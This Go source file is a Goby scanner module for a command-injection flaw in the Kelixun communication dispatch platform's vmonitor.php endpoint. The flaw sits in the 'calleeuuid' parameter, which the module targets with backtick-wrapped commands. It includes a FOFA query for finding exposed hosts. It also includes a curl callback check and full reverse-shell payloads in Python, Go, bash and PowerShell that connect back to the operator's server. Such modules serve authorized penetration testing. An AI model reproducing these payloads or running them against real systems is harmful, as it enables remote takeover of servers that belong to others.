package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Kelixun Communication Command and Dispatch Platform vmonitor.php Command Execution Vulnerability",
    "Description": "<p>The Kelixun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient command, dispatch, and management solutions to help communication operators or related institutions achieve better operational efficiency and service quality. This platform provides powerful command and dispatch functions, which can monitor and manage communication network equipment, maintenance personnel, and work tasks in real time. Users can send instructions, schedule personnel, assign tasks, and receive real-time on-site feedback and reports through this platform.</p>",
    "Product": "Kelixun Communication Command and Dispatch Management Platform",
    "Homepage": "https://kirisun.com.cn/products/pid-5/",
    "DisclosureDate": "2024-08-02",
    "PostTime": "2024-08-15",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"指挥调度管理平台\" && title=\"指挥调度管理平台\"",
    "GobyQuery": "body=\"指挥调度管理平台\" && title=\"指挥调度管理平台\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"https://kirisun.com.cn/products/pid-5/\">https://kirisun.com.cn/products/pid-5/</a> </p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit the public from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "科立讯通信指挥调度平台 vmonitor.php 命令执行漏洞",
            "Product": "科立讯通信指挥调度管理平台",
            "Description": "<p>科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务，并即时获取现场反馈和报告。<br></p>",
            "Recommendation": "<p>1.关注厂商官网，及时关注更新信息：<a href=\"https://kirisun.com.cn/products/pid-5/\">https://kirisun.com.cn/products/pid-5/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Kelixun Communication Command and Dispatch Platform vmonitor.php Command Execution Vulnerability",
            "Product": "Kelixun Communication Command and Dispatch Management Platform",
            "Description": "<p>The Kelixun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient command, dispatch, and management solutions to help communication operators or related institutions achieve better operational efficiency and service quality. This platform provides powerful command and dispatch functions, which can monitor and manage communication network equipment, maintenance personnel, and work tasks in real time. Users can send instructions, schedule personnel, assign tasks, and receive real-time on-site feedback and reports through this platform.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"https://kirisun.com.cn/products/pid-5/\">https://kirisun.com.cn/products/pid-5/</a>&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit the public from accessing the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9933"
}`
	// 请注意：在编写POC时，请确认哪一种reverse方式，能够正常反弹Shell，在POC提交审核的时候，只保留能够成功反弹Shell的选项

	//setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestHashwsaPWu7G := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码
		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败
		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfig := httpclient.NewGetRequestConfig(url)
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = false

			for headName, headValue := range head {
				getRequestConfig.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		}
		defineHeader := map[string]string{}

		urlGet := fmt.Sprintf("/api/client/vmonitor.php?extension=1&calleeuuid=`%s`", url.QueryEscape(command))
		resp, err := setGetRequest(hostInfo, urlGet, defineHeader)

		if resp == nil || resp.StatusCode != 200 {
			return false, "", errors.New("Fail")
		}
		if err != nil {
			return false, "", err
		}
		ok = true
		vulURL = "/api/client/vmonitor.php"
		return ok, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashwsaPWu7G

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				// pocCommand = "ping -c 1 " + checkUrl
				pocCommand = "curl " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequestHashwsaPWu7G

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
